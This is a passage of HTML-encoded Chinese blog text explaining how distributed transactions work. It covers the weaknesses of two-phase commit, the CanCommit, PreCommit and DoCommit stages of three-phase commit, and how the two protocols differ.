02;</li>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D7;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53CD;&#x9988;&#x7684;&#x201D;&#x56DE;&#x6EDA;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x53D6;&#x6D88;&#x4E8B;&#x52A1;</li>\n</ol>\n<p>&#x4E0D;&#x7BA1;&#x6700;&#x540E;&#x7ED3;&#x679C;&#x5982;&#x4F55;&#xFF0C;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x90FD;&#x4F1A;&#x7ED3;&#x675F;&#x5F53;&#x524D;&#x4E8B;&#x52A1;</p>\n<h4 id=\"&#x4E8C;&#x9636;&#x6BB5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;\"><a href=\"#&#x4E8C;&#x9636;&#x6BB5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x4E8C;&#x9636;&#x6BB5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;\"></a>&#x4E8C;&#x9636;&#x6BB5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;</h4><ol>\n<li><strong>&#x540C;&#x6B65;&#x963B;&#x585E;&#x95EE;&#x9898;</strong>&#x3002;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8282;&#x70B9;&#x90FD;&#x662F;&#x4E8B;&#x52A1;&#x963B;&#x585E;&#x578B;&#x7684;&#x3002;&#x5F53;&#x53C2;&#x4E0E;&#x8005;&#x5360;&#x6709;&#x516C;&#x5171;&#x8D44;&#x6E90;&#x65F6;&#xFF0C;&#x5176;&#x4ED6;&#x7B2C;&#x4E09;&#x65B9;&#x8282;&#x70B9;&#x8BBF;&#x95EE;&#x516C;&#x5171;&#x8D44;&#x6E90;&#x4E0D;&#x5F97;&#x4E0D;&#x5904;&#x4E8E;&#x963B;&#x585E;&#x72B6;&#x6001;&#x3002;</li>\n<li><strong>&#x5355;&#x70B9;&#x6545;&#x969C;</strong>&#x3002;&#x7531;&#x4E8E;&#x534F;&#x8C03;&#x8005;&#x7684;&#x91CD;&#x8981;&#x6027;&#xFF0C;&#x4E00;&#x65E6;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x6545;&#x969C;&#x3002;&#x53C2;&#x4E0E;&#x8005;&#x4F1A;&#x4E00;&#x76F4;&#x963B;&#x585E;&#x4E0B;&#x53BB;&#x3002;&#x5C24;&#x5176;&#x5728;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF0C;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x6545;&#x969C;&#xFF0C;&#x90A3;&#x4E48;&#x6240;&#x6709;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x8FD8;&#x90FD;&#x5904;&#x4E8E;&#x9501;&#x5B9A;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x7684;&#x72B6;&#x6001;&#x4E2D;&#xFF0C;&#x800C;&#x65E0;&#x6CD5;&#x7EE7;&#x7EED;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#x3002;&#xFF08;&#x5982;&#x679C;&#x662F;&#x534F;&#x8C03;&#x8005;&#x6302;&#x6389;&#xFF0C;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x9009;&#x4E3E;&#x4E00;&#x4E2A;&#x534F;&#x8C03;&#x8005;&#xFF0C;&#x4F46;&#x662F;&#x65E0;&#x6CD5;&#x89E3;&#x51B3;&#x56E0;&#x4E3A;&#x534F;&#x8C03;&#x8005;&#x5B95;&#x673A;&#x5BFC;&#x81F4;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x5904;&#x4E8E;&#x963B;&#x585E;&#x72B6;&#x6001;&#x7684;&#x95EE;&#x9898;&#xFF09;</li>\n<li><strong>&#x6570;&#x636E;&#x4E0D;&#x4E00;&#x81F4;</strong>&#x3002;&#x5728;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x7684;&#x9636;&#x6BB5;&#x4E8C;&#x4E2D;&#xFF0C;&#x5F53;&#x534F;&#x8C03;&#x8005;&#x5411;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;commit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x751F;&#x4E86;&#x5C40;&#x90E8;&#x7F51;&#x7EDC;&#x5F02;&#x5E38;&#x6216;&#x8005;&#x5728;&#x53D1;&#x9001;commit&#x8BF7;&#x6C42;&#x8FC7;&#x7A0B;&#x4E2D;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x4E86;&#x6545;&#x969C;&#xFF0C;&#x8FD9;&#x56DE;&#x5BFC;&#x81F4;&#x53EA;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x53D7;&#x5230;&#x4E86;commit&#x8BF7;&#x6C42;&#x3002;&#x800C;&#x5728;&#x8FD9;&#x90E8;&#x5206;&#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x5230;commit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#x5C31;&#x4F1A;&#x6267;&#x884C;commit&#x64CD;&#x4F5C;&#x3002;&#x4F46;&#x662F;&#x5176;&#x4ED6;&#x90E8;&#x5206;&#x672A;&#x63A5;&#x5230;commit&#x8BF7;&#x6C42;&#x7684;&#x673A;&#x5668;&#x5219;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x3002;&#x4E8E;&#x662F;&#x6574;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4FBF;&#x51FA;&#x73B0;&#x4E86;&#x6570;&#x636E;&#x90E8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x73B0;&#x8C61;&#x3002;</li>\n<li><strong>&#x4E8C;&#x9636;&#x6BB5;&#x65E0;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;</strong>&#xFF1A;&#x534F;&#x8C03;&#x8005;&#x518D;&#x53D1;&#x51FA;commit&#x6D88;&#x606F;&#x4E4B;&#x540E;&#x5B95;&#x673A;&#xFF0C;&#x800C;&#x552F;&#x4E00;&#x63A5;&#x6536;&#x5230;&#x8FD9;&#x6761;&#x6D88;&#x606F;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x540C;&#x65F6;&#x4E5F;&#x5B95;&#x673A;&#x4E86;&#x3002;&#x90A3;&#x4E48;&#x5373;&#x4F7F;&#x534F;&#x8C03;&#x8005;&#x901A;&#x8FC7;&#x9009;&#x4E3E;&#x534F;&#x8BAE;&#x4EA7;&#x751F;&#x4E86;&#x65B0;&#x7684;&#x534F;&#x8C03;&#x8005;&#xFF0C;&#x8FD9;&#x6761;&#x4E8B;&#x52A1;&#x7684;&#x72B6;&#x6001;&#x4E5F;&#x662F;&#x4E0D;&#x786E;&#x5B9A;&#x7684;&#xFF0C;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x4E8B;&#x52A1;&#x662F;&#x5426;&#x88AB;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;</li>\n</ol>\n<hr>\n<h3 id=\"&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;Three-phase-commit-3PC&#xFF09;\"><a href=\"#&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;Three-phase-commit-3PC&#xFF09;\" class=\"headerlink\" title=\"&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;Three-phase commit/3PC&#xFF09;\"></a>&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;Three-phase commit/3PC&#xFF09;</h3><font style=\"color:red;\">&#x6539;&#x8FDB;&#x4E86;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;,3PC&#x4E3B;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x5355;&#x70B9;&#x6545;&#x969C;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x51CF;&#x5C11;&#x963B;&#x585E;</font>\n\n<ul>\n<li>&#x5F15;&#x5165;&#x8D85;&#x65F6;&#x673A;&#x5236;&#x3002;&#x540C;&#x65F6;&#x5728;&#x534F;&#x8C03;&#x8005;&#x548C;&#x53C2;&#x4E0E;&#x8005;&#x4E2D;&#x90FD;&#x5F15;&#x5165;&#x8D85;&#x65F6;&#x673A;&#x5236;&#x3002;</li>\n<li>&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x548C;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x51C6;&#x5907;&#x9636;&#x6BB5;&#x3002;&#x4FDD;&#x8BC1;&#x4E86;&#x5728;&#x6700;&#x540E;&#x63D0;&#x4EA4;&#x9636;&#x6BB5;&#x4E4B;&#x524D;&#x5404;&#x53C2;&#x4E0E;&#x8282;&#x70B9;&#x7684;&#x72B6;&#x6001;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002;</li>\n</ul>\n<p>&#x9664;&#x4E86;&#x5F15;&#x5165;&#x8D85;&#x65F6;&#x673A;&#x5236;&#x4E4B;&#x5916;&#xFF0C;3PC&#x628A;2PC&#x7684;&#x51C6;&#x5907;&#x9636;&#x6BB5;&#x518D;&#x6B21;&#x4E00;&#x5206;&#x4E3A;&#x4E8C;&#xFF0C;&#x8FD9;&#x6837;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5C31;&#x6709;CanCommit&#x3001;PreCommit&#x3001;DoCommit&#x4E09;&#x4E2A;&#x9636;&#x6BB5;&#x3002;</p>\n<h4 id=\"CanCommit&#x9636;&#x6BB5;\"><a href=\"#CanCommit&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"CanCommit&#x9636;&#x6BB5;\"></a>CanCommit&#x9636;&#x6BB5;</h4><ol>\n<li><strong>&#x4E8B;&#x52A1;&#x8BE2;&#x95EE;</strong> &#x534F;&#x8C03;&#x8005;&#x5411;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;CanCommit&#x8BF7;&#x6C42;&#x3002;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x64CD;&#x4F5C;&#x3002;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x7B49;&#x5F85;&#x53C2;&#x4E0E;&#x8005;&#x7684;&#x54CD;&#x5E94;&#x3002;</li>\n<li><strong>&#x54CD;&#x5E94;&#x53CD;&#x9988;</strong> &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x5230;CanCommit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x5176;&#x81EA;&#x8EAB;&#x8BA4;&#x4E3A;&#x53EF;&#x4EE5;&#x987A;&#x5229;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;Yes&#x54CD;&#x5E94;&#xFF0C;&#x5E76;&#x8FDB;&#x5165;&#x9884;&#x5907;&#x72B6;&#x6001;&#x3002;&#x5426;&#x5219;&#x53CD;&#x9988;No</li>\n</ol>\n<h4 id=\"PreCommit&#x9636;&#x6BB5;\"><a href=\"#PreCommit&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"PreCommit&#x9636;&#x6BB5;\"></a>PreCommit&#x9636;&#x6BB5;</h4><p>&#x5047;&#x5982;&#x534F;&#x8C03;&#x8005;&#x4ECE;&#x6240;&#x6709;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x83B7;&#x5F97;&#x7684;&#x53CD;&#x9988;&#x90FD;&#x662F;Yes&#x54CD;&#x5E94;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x9884;&#x6267;&#x884C;</p>\n<ol>\n<li><strong>&#x53D1;&#x9001;&#x9884;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42;</strong> &#x534F;&#x8C03;&#x8005;&#x5411;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;PreCommit&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x8FDB;&#x5165;Prepared&#x9636;&#x6BB5;&#x3002;</li>\n<li><strong>&#x4E8B;&#x52A1;&#x9884;&#x63D0;&#x4EA4;</strong> &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;PreCommit&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x4F1A;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5C06;undo&#x548C;redo&#x4FE1;&#x606F;&#x8BB0;&#x5F55;&#x5230;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x4E2D;&#x3002;</li>\n<li><strong>&#x54CD;&#x5E94;&#x53CD;&#x9988;</strong> &#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x6210;&#x529F;&#x7684;&#x6267;&#x884C;&#x4E86;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;ACK&#x54CD;&#x5E94;&#xFF0C;&#x540C;&#x65F6;&#x5F00;&#x59CB;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6307;&#x4EE4;&#x3002;</li>\n</ol>\n<p>&#x5047;&#x5982;&#x6709;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x53C2;&#x4E0E;&#x8005;&#x5411;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;&#x4E86;No&#x54CD;&#x5E94;&#xFF0C;&#x6216;&#x8005;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x534F;&#x8C03;&#x8005;&#x90FD;&#x6CA1;&#x6709;&#x63A5;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x7684;&#x54CD;&#x5E94;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x4E2D;&#x65AD;&#x3002;</p>\n<ol>\n<li><strong>&#x53D1;&#x9001;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;</strong> &#x534F;&#x8C03;&#x8005;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;abort&#x8BF7;&#x6C42;&#x3002;</li>\n<li><strong>&#x4E2D;&#x65AD;&#x4E8B;&#x52A1;</strong> &#x53C2;&#x4E0E;&#x8005;&#x6536;&#x5230;&#x6765;&#x81EA;&#x534F;&#x8C03;&#x8005;&#x7684;abort&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF08;&#x6216;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x4ECD;&#x672A;&#x6536;&#x5230;&#x534F;&#x8C03;&#x8005;&#x7684;&#x8BF7;&#x6C42;&#xFF09;&#xFF0C;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x4E2D;&#x65AD;&#x3002;</li>\n</ol>\n<h4 id=\"doCommit&#x9636;&#x6BB5;\"><a href=\"#doCommit&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"doCommit&#x9636;&#x6BB5;\"></a>doCommit&#x9636;&#x6BB5;</h4><p>&#x8BE5;&#x9636;&#x6BB5;&#x8FDB;&#x884C;&#x771F;&#x6B63;&#x7684;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;&#x4E24;&#x79CD;&#x60C5;&#x51B5;</p>\n<p><strong>&#x6267;&#x884C;&#x63D0;&#x4EA4;</strong></p>\n<ol>\n<li><strong>&#x53D1;&#x9001;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42; </strong>&#x534F;&#x8C03;&#x63A5;&#x6536;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;&#x7684;ACK&#x54CD;&#x5E94;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x5C06;&#x4ECE;&#x9884;&#x63D0;&#x4EA4;&#x72B6;&#x6001;&#x8FDB;&#x5165;&#x5230;&#x63D0;&#x4EA4;&#x72B6;&#x6001;&#x3002;&#x5E76;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;doCommit&#x8BF7;&#x6C42;&#x3002;</li>\n<li><strong>&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;</strong> &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;doCommit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x6267;&#x884C;&#x6B63;&#x5F0F;&#x7684;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x3002;&#x5E76;&#x5728;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#x91CA;&#x653E;&#x6240;&#x6709;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x3002;</li>\n<li><strong>&#x54CD;&#x5E94;&#x53CD;&#x9988;</strong> &#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;&#x5411;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;Ack&#x54CD;&#x5E94;&#x3002;</li>\n<li><strong>&#x5B8C;&#x6210;&#x4E8B;&#x52A1;</strong> &#x534F;&#x8C03;&#x8005;&#x63A5;&#x6536;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x7684;ack&#x54CD;&#x5E94;&#x4E4B;&#x540E;&#xFF0C;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;</li>\n</ol>\n<p><strong>&#x4E2D;&#x65AD;&#x4E8B;&#x52A1;</strong></p>\n<p>&#x534F;&#x8C03;&#x8005;&#x6CA1;&#x6709;&#x63A5;&#x6536;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;&#x7684;ACK&#x54CD;&#x5E94;&#xFF08;&#x53EF;&#x80FD;&#x662F;&#x63A5;&#x53D7;&#x8005;&#x53D1;&#x9001;&#x7684;&#x4E0D;&#x662F;ACK&#x54CD;&#x5E94;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x54CD;&#x5E94;&#x8D85;&#x65F6;&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x4E2D;&#x65AD;&#x4E8B;&#x52A1;&#x3002;</p>\n<ol>\n<li><strong>&#x53D1;&#x9001;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;</strong> &#x534F;&#x8C03;&#x8005;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;abort&#x8BF7;&#x6C42;</li>\n<li><strong>&#x4E8B;&#x52A1;&#x56DE;&#x6EDA;</strong> &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;abort&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x5229;&#x7528;&#x5176;&#x5728;&#x9636;&#x6BB5;&#x4E8C;&#x8BB0;&#x5F55;&#x7684;undo&#x4FE1;&#x606F;&#x6765;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x56DE;&#x6EDA;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5728;&#x5B8C;&#x6210;&#x56DE;&#x6EDA;&#x4E4B;&#x540E;&#x91CA;&#x653E;&#x6240;&#x6709;&#x7684;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x3002;</li>\n<li><strong>&#x53CD;&#x9988;&#x7ED3;&#x679C;</strong> &#x53C2;&#x4E0E;&#x8005;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x56DE;&#x6EDA;&#x4E4B;&#x540E;&#xFF0C;&#x5411;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;ACK&#x6D88;&#x606F;</li>\n<li><strong>&#x4E2D;&#x65AD;&#x4E8B;&#x52A1;</strong> &#x534F;&#x8C03;&#x8005;&#x63A5;&#x6536;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x53CD;&#x9988;&#x7684;ACK&#x6D88;&#x606F;&#x4E4B;&#x540E;&#xFF0C;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x4E2D;&#x65AD;</li>\n</ol>\n<p><strong>&#x5728;doCommit&#x9636;&#x6BB5;&#xFF0C;&#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x65E0;&#x6CD5;&#x53CA;&#x65F6;&#x63A5;&#x6536;&#x5230;&#x6765;&#x81EA;&#x534F;&#x8C03;&#x8005;&#x7684;doCommit&#x6216;&#x8005;rebort&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x7EE7;&#x7EED;&#x8FDB;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x63D0;&#x4EA4;&#x3002;&#xFF08;&#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x5E94;&#x8BE5;&#x662F;&#x57FA;&#x4E8E;&#x6982;&#x7387;&#x6765;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;<font style=\"color:red;\">&#x5F53;&#x8FDB;&#x5165;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;&#x53C2;&#x4E0E;&#x8005;&#x5728;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x5DF2;&#x7ECF;&#x6536;&#x5230;&#x4E86;PreCommit&#x8BF7;&#x6C42;&#xFF0C;</font>&#x90A3;&#x4E48;&#x534F;&#x8C03;&#x8005;&#x4EA7;&#x751F;PreCommit&#x8BF7;&#x6C42;&#x7684;&#x524D;&#x63D0;&#x6761;&#x4EF6;&#x662F;&#x4ED6;&#x5728;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#xFF0C;&#x6536;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x7684;CanCommit&#x54CD;&#x5E94;&#x90FD;&#x662F;Yes&#x3002;&#xFF08;&#x4E00;&#x65E6;&#x53C2;&#x4E0E;&#x8005;&#x6536;&#x5230;&#x4E86;PreCommit&#xFF0C;&#x610F;&#x5473;&#x4ED6;&#x77E5;&#x9053;&#x5927;&#x5BB6;&#x5176;&#x5B9E;&#x90FD;&#x540C;&#x610F;&#x4FEE;&#x6539;&#x4E86;&#xFF09;&#x6240;&#x4EE5;&#xFF0C;&#x4E00;&#x53E5;&#x8BDD;&#x6982;&#x62EC;&#x5C31;&#x662F;&#xFF0C;&#x5F53;&#x8FDB;&#x5165;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x8D85;&#x65F6;&#x7B49;&#x539F;&#x56E0;&#xFF0C;&#x867D;&#x7136;&#x53C2;&#x4E0E;&#x8005;&#x6CA1;&#x6709;&#x6536;&#x5230;commit&#x6216;&#x8005;abort&#x54CD;&#x5E94;&#xFF0C;&#x4F46;&#x662F;&#x4ED6;&#x6709;&#x7406;&#x7531;&#x76F8;&#x4FE1;&#xFF1A;&#x6210;&#x529F;&#x63D0;&#x4EA4;&#x7684;&#x51E0;&#x7387;&#x5F88;&#x5927;&#x3002; &#xFF09;</strong></p>\n<hr>\n<h3 id=\"2PC&#x4E0E;3PC&#x7684;&#x533A;&#x522B;\"><a href=\"#2PC&#x4E0E;3PC&#x7684;&#x533A;&#x522B;\" class=\"headerlink\" title=\"2PC&#x4E0E;3PC&#x7684;&#x533A;&#x522B;\"></a>2PC&#x4E0E;3PC&#x7684;&#x533A;&#x522B;</h3><font style=\"color:red;\"><br>&#x76F8;&#x5BF9;&#x4E8E;2PC&#xFF0C;3PC&#x4E3B;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x5355;&#x70B9;&#x6545;&#x969C;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x51CF;&#x5C11;&#x963B;&#x585E;&#xFF0C;&#x56E0;&#x4E3A;&#x4E00;&#x65E6;&#x53C2;&#x4E0E;&#x8005;&#x65E0;&#x6CD5;&#x53CA;&#x65F6;&#x6536;&#x5230;&#x6765;&#x81EA;&#x534F;&#x8C03;&#x8005;&#x7684;&#x4FE1;&#x606F;&#x4E4B;&#x540E;&#xFF0C;&#x4ED6;&#x4F1A;&#x9ED8;&#x8BA4;&#x6267;&#x884C;commit&#x3002;&#x800C;&#x4E0D;&#x4F1A;&#x4E00;&#x76F4;&#x6301;&#x6709;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x5E76;&#x5904;&#x4E8E;&#x963B;&#x585E;&#x72B6;&#x6001;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x673A;&#x5236;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x4E3A;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x539F;&#x56E0;&#xFF0C;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;&#x7684;abort&#x54CD;&#x5E94;&#x6CA1;&#x6709;&#x53CA;&#x65F6;&#x88AB;&#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;&#xFF0C;&#x90A3;&#x4E48;&#x53C2;&#x4E0E;&#x8005;&#x5728;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#x6267;&#x884C;&#x4E86;commit&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x548C;&#x5176;&#x4ED6;&#x63A5;&#x5230;abort&#x547D;&#x4EE4;&#x5E76;&#x6267;&#x884C;&#x56DE;&#x6EDA;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x6570;&#x636E;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x60C5;&#x51B5;&#x3002;</font>\n\n<hr>\n<h3 id=\"&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x5BF9;2PC&#x548C;3PC&#x533A;&#x522B;&#x7684;&#x63CF;&#x8FF0;\"><a href=\"#&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x5BF9;2PC&#x548C;3PC&#x533A;&#x522B;&#x7684;&#x63CF;&#x8FF0;\" class=\"headerlink\" title=\"&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x5BF9;2PC&#x548C;3PC&#x533A;&#x522B;&#x7684;&#x63CF;&#x8FF0;\"></a>&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x5BF9;2PC&#x548C;3PC&#x533A;&#x522B;&#x7684;&#x63CF;&#x8FF0;</h3><p>&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Three-phase commit&#xFF09;&#xFF0C;&#x4E5F;&#x53EB;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Three-phase commit protocol&#xFF09;&#xFF0C;&#x662F;&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x7F51;&#x7EDC;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x7684;&#x8303;&#x7574;&#x4E0B;&#xFF0C;&#x4F7F;&#x5F97;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x5185;&#x7684;&#x6240;&#x6709;&#x8282;&#x70B9;&#x80FD;&#x591F;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x63D0;&#x4EA4;&#x7684;&#x4E00;&#x79CD;&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;&#x3002;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x662F;&#x4E3A;&#x89E3;&#x51B3;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;|&#x7684;&#x7F3A;&#x70B9;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x3002;</p>\n<p><strong>&#x4E0E;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x662F;&#x201C;&#x975E;&#x963B;&#x585E;&#x201D;&#x534F;&#x8BAE;&#x3002;</strong>&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5728;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x7684;&#x7B2C;&#x4E00;&#x9636;&